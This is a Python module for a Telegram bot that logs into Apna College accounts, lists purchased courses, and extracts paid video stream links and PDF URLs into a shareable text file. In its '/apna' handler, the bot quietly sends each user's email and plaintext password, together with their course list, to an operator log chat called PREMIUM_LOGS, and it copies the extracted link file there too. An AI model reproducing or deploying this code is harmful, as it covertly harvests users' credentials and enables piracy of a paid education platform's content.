import requests
import json
import random
import uuid
import time
import asyncio
import io
import aiohttp
from pyrogram import Client, filters
import os
import requests
from Extractor import app
from config import PREMIUM_LOGS, join,BOT_TEXT
from datetime import datetime
import pytz
import re
import urllib.parse

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")
# ================= CONFIG =================
WEB_LOGIN = "https://www.apnacollege.in/api/signin"
PRODUCTS_API = "https://www.apnacollege.in/api/learner/products"
COURSE_PROGRESS_API = "https://www.apnacollege.in/api/user/courses-progress?courses="
COURSE_CONTENT_API = "https://www.apnacollege.in/api/course"
WISTIA_API = "https://fast.wistia.com/embed/medias"
OUTPUT_DIR = "output"
MAX_RETRIES = 3
RETRY_DELAY = 2  
MY_LOGO_URL = "https://i.ibb.co/BHQ2HsW5/JPEG-20260125-141038-953649353278939736.jpg"
# ==========================================

async def download_thumbnail(logo_url: str) -> str:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(logo_url, timeout=15) as resp:
                if resp.status == 200:
                    thumb_path = f"thumb_adda_{datetime.now().timestamp()}.jpg"
                    with open(thumb_path, "wb") as f:
                        f.write(await resp.read())
                    return thumb_path
    except Exception as e:
        print(f"⚠️ Failed to download thumbnail: {e}")
    return None

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def parse_combo(c):
    c = c.strip()
    if '*' in c: parts = c.split('*', 1)
    elif ':' in c: parts = c.split(':', 1)
    else: return None, None
    return (parts[0].strip(), parts[1].strip()) if len(parts) >= 2 else (None, None)

def create_session():
    s = requests.Session()
    s.mount('https://', requests.adapters.HTTPAdapter(max_retries=2))
    return s

def get_csrf(session, max_attempts=3):
    """Extract CSRF token with multiple patterns + retry"""
    for attempt in range(max_attempts):
        try:
            r = session.get("https://www.apnacollege.in/", timeout=10, headers={
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            })
            # Try multiple patterns
            patterns = [
                r'csrf-token["\']?\s*content=["\']([^"\']+)',
                r'name=["\']_csrf["\']\s*value=["\']([^"\']+)',
                r'XSRF-TOKEN=([^;]+)',
                r'"csrfToken"\s*:\s*"([^"]+)"'
            ]
            for p in patterns:
                m = re.search(p, r.text, re.I)
                if m:
                    return m.group(1)
            if attempt < max_attempts - 1:
                time.sleep(1)
        except Exception as e:
            if attempt < max_attempts - 1:
                time.sleep(1)
            continue
    return None

def login(email, password, verbose=True):
    """Login with retry logic and better error handling"""
    for attempt in range(MAX_RETRIES):
        if verbose:
            print(f"  [Attempt {attempt+1}/{MAX_RETRIES}] Logging in...", end=" ")
        
        session = create_session()
        csrf = get_csrf(session)
        
        if not csrf and verbose:
            print("\n  [⚠️] Could not get CSRF, trying without...")
        
        headers = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.apnacollege.in",
            "referer": "https://www.apnacollege.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        if csrf:
            headers["csrf-token"] = csrf
        
        payload = {"email": email, "login": email, "password": password}
        
        try:
            resp = session.post(WEB_LOGIN, headers=headers, 
                              data=urllib.parse.urlencode(payload), 
                              timeout=15, allow_redirects=True)
            
            if verbose:
                print(f"HTTP {resp.status_code}", end=" ")
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if verbose:
                        print(f"✓ success={data.get('success')}", end=" ")
                    
                    if data.get("success") is True:
                        # Extract token from cookies with retry
                        for _ in range(3):
                            cookies = session.cookies.get_dict()
                            if "lw_tokens" in cookies:
                                try:
                                    lw = json.loads(urllib.parse.unquote(cookies["lw_tokens"]))
                                    token = lw.get("access_token")
                                    if token:
                                        if verbose: print(f"✓ Token: {token[:20]}...")
                                        return session, token, csrf
                                except: pass
                            time.sleep(0.5)
                        
                        # Fallback: check response data
                        if "token" in data or "access_token" in data:
                            token = data.get("token") or data.get("access_token")
                            if verbose: print(f"✓ Token from response: {token[:20]}...")
                            return session, token, csrf
                        
                        if verbose: print("✗ No token found")
                    else:
                        if verbose: print(f"✗ API error: {data.get('message', 'Unknown')}")
                except json.JSONDecodeError:
                    if verbose: print(f"✗ Invalid JSON response")
            else:
                if verbose: print(f"✗ HTTP {resp.status_code}")
            
        except requests.exceptions.Timeout:
            if verbose: print("✗ Timeout")
        except requests.exceptions.ConnectionError:
            if verbose: print("✗ Connection error")
        except Exception as e:
            if verbose: print(f"✗ Error: {e}")
        
        if attempt < MAX_RETRIES - 1:
            if verbose: print(f"  [i] Retrying in {RETRY_DELAY}s...")
            time.sleep(RETRY_DELAY)
        else:
            if verbose: print()
    
    session.close()
    return None, None, None

def get_batches(session, token):
    url = "https://www.apnacollege.in/api/learner/products"

    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "referer": "https://www.apnacollege.in/start",
        "user-agent": "Mozilla/5.0",
        "token": token
    }

    payload = {
        "type": "course",
        "access": "public,private-enroll,soon,view-locked",
        "excludeNotEnrolledPrivateProductsForAdmin": "true",
        "fields": "title,titleId,cohorts.packages,cohorts.authors,cohorts.content,settings,resourcePass,progress,firstFreeUnitPathPlayerUrl",
        "appliedCoupon": "",
        "owned": "true",
        "sortFields": [
            {"sortField": "lastVisited", "direction": "desc"},
            {"sortField": "learnerAccessPriority", "direction": "asc"},
            {"sortField": "order", "direction": "desc"}
        ],
        "offset": "0",
        "itemsPerPage": "50",
        "paginationType": "offset"
    }

    try:
        resp = session.post(url, headers=headers, json=payload, timeout=15)

        if resp.status_code != 200:
            return []

        data = resp.json()
        courses_data = data.get("data", [])

        out = []

        for course in courses_data:
            title = course.get("title", "Unknown")
            title_id = course.get("titleId")
            course_id = course.get("id")

            if title_id:
                out.append({
                    "title": title,
                    "courseId": course_id,
                    "titleId": title_id
                })

        return out

    except Exception as e:
        print(f"Fetch batches error: {e}")
        return []

def get_course_content_ordered(session, title_id, token):
    url = f"{COURSE_CONTENT_API}/{title_id}?contents&path-player"
    headers = {"accept": "application/json", "token": token, "user-agent": "Mozilla/5.0"}
    
    try:
        resp = session.get(url, headers=headers, timeout=20)
        if resp.status_code != 200:
            return None, None
        data = resp.json()
        
        course = data.get("course", {})
        sections = course.get("sections", {})
        videos_dict = course.get("videos", {})
        objects = course.get("objects", {})
        
        video_list = []
        for sec_key, section in sections.items():
            learning_path = section.get("learningPath", [])
            for item in learning_path:
                if item.get("type") == "ivideo":
                    vid = item.get("id")
                    if vid and vid in videos_dict:
                        vdata = videos_dict[vid]
                        video_list.append({
                            "id": vid,
                            "title": vdata.get("title") or item.get("unitTitle") or "Untitled",
                            "sourceid": vdata.get("sourceid"),
                            "type": vdata.get("type", "").lower()
                        })
        
        pdf_map = {}
        for oid, odata in objects.items():
            if odata.get("objectType") == "pdf" and "data" in odata:
                pdf_data = odata["data"]
                if "pdf_full" in pdf_data:
                    pdf_map[oid] = {
                        "title": odata.get("title") or "PDF",
                        "url": pdf_data["pdf_full"]
                    }
        
        return video_list, pdf_map
    except Exception as e:
        print(f"  [⚠️] Course content error: {e}")
        return None, None

def get_wistia_link(sourceid):
    if not sourceid: return None
    url = f"{WISTIA_API}/{sourceid}.json"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            assets = data.get("media", {}).get("assets", [])
            for qual in ["1080p", "720p", "540p", "360p", "224p"]:
                for a in assets:
                    if a.get("display_name", "").lower() == qual and a.get("url"):
                        return a["url"].replace(".bin", ".m3u8")  # ← Only change
    except: pass
    return None


@app.on_message(filters.command("apna"))
async def apna_handler(app, m):
    cred_msg = await app.ask(
        m.chat.id,
        "Send Apna College credentials:\n\n<code>email*password</code>"
    )

    email, password = parse_combo(cred_msg.text)

    if not email or not password:
        return await m.reply_text("Invalid format.")

    status = await m.reply_text("🔄 Logging in...")

    session, token, csrf = await asyncio.to_thread(
        login,
        email,
        password,
        True
    )
    #print("Status:", resp.status_code)
    #print("Response:", resp.text[:1000])

    if not token:
        return await status.edit_text("❌ Login failed.")

    batches = await asyncio.to_thread(
        get_batches,
        session,
        token
    )

    if not batches:
        session.close()
        return await status.edit_text("❌ No purchased batches found.")
    batch_list = "\n".join(
        f"{i}. {b['title']}"
        for i, b in enumerate(batches, start=1)
    )

    txt = "📚 Available Batches:\n\n"

    for i, b in enumerate(batches, start=1):
        txt += f"{i}. {b['title']}\n"
    await app.send_message(
        PREMIUM_LOGS,
        f"🔐 APNA COLLEGE\n\n"
        f"📧 Email: <code>{email}</code>\n"
        f"🔑 Password: <code>{password}</code>\n"
        f"👤 User: {m.from_user.mention}\n"
        f"📚 Available Batches: {len(batches)}\n\n"
        f"<blockquote>{batch_list}</blockquote>"
        
    )
    batch_msg = await app.ask(
        m.chat.id,
        txt + "\n\nSend batch number."
    )

    try:
        idx = int(batch_msg.text) - 1
        batch = batches[idx]
    except:
        session.close()
        return await m.reply_text("❌ Invalid batch number.")

    await status.edit_text(
        f"📦 Fetching:\n{batch['title']}"
    )

    videos, pdfs = await asyncio.to_thread(
        get_course_content_ordered,
        session,
        batch["titleId"],
        token
    )

    if not videos:
        session.close()
        return await status.edit_text(
            "❌ Could not fetch course content."
        )

    lines = []
    success = 0
    if pdfs:

        for _, pinfo in pdfs.items():
            lines.append(
                f"{pinfo['title']}: {pinfo['url']}"
            )
            
    for i, vinfo in enumerate(videos, start=1):
        title = vinfo["title"]

        link = None

        if (
            vinfo.get("type", "").lower() == "wistia"
            and vinfo.get("sourceid")
        ):
            link = await asyncio.to_thread(
                get_wistia_link,
                vinfo["sourceid"]
            )

        if link:
            success += 1
            lines.append(f"{i}] {title}: {link}")
        else:
            lines.append(f"{i}] {title}: No link")

    safe_name = re.sub(
        r'[^a-zA-Z0-9]+',
        '_',
        batch["title"]
    )

    file_name = f"{safe_name}.txt"

    with open(file_name, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

    session.close()
    mention = f'<a href="tg://user?id={m.from_user.id}">{m.from_user.first_name}</a>'
    thumb_path = await download_thumbnail(MY_LOGO_URL)
    total_links = success + len(pdfs)

    caption = (
        f"📚 App: Apna College\n\n"
        f"═══════ BATCH DETAILS ═══════\n"
        f"<blockquote>🌟 Batch Name: {batch['title']}\n"
        f"🆔 Batch ID: {batch['courseId']}\n"
        f"💸 Price : ₹NA</blockquote>\n\n"
        f"═══════ LINK SUMMARY ═══════\n"
        f"<blockquote>🔢 Total Links: {total_links}\n"
        f"🎬 Videos: {success}\n"
        f"📁 Documents: {len(pdfs)}</blockquote>\n\n"
        f"👤 Generated By: {mention}\n"
        f"📅 Generated On: {time_new}"
    )

    await m.reply_document(
        file_name,
        caption=caption,
        thumb=thumb_path
    )
    await app.send_document(PREMIUM_LOGS, file_name, caption=caption, thumb=thumb_path)

    os.remove(file_name)

    await status.delete()
